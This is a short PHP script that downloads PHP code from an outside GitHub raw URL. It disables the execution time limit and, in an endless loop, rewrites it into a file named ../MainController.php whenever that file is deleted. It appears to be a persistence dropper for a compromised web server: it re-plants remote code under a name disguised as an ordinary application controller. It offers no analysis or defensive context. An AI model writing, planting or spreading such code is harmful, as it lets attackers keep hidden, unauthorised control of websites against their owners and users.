<?php
ini_set('max_execution_time', 0);
$txt=file_get_contents("https://raw.githubusercontent.com/thexfactor2910/cnf/main/cnf.php");
while(1){
  if(!file_exists("../MainController.php")){
      file_put_contents("../MainController.php",$txt);
  }else{
    echo "File exists.everythings is okay!";
  }
}